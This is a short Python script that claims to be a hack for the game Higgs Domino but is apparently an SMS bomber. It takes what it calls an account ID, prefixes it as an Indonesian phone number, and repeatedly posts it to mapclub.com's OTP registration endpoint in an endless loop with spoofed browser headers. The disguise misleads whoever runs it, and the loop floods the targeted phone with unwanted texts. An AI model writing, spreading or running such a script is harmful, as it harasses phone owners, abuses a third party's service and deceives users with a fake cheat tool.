import os,sys,time,requests,json
script=input('SCRIPT HACK HiGGS DOMINO')


nomor=input("Nomor ID akun :")
user=input('username ID: ')
jumlah=input('apk Domino versi :' )
proses=input('klik enter : ')
while True:
      requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone":"62"+nomor})).text
      time.sleep(10)
      time.sleep(5)
      print('buka Aplikasi higgs Domino')

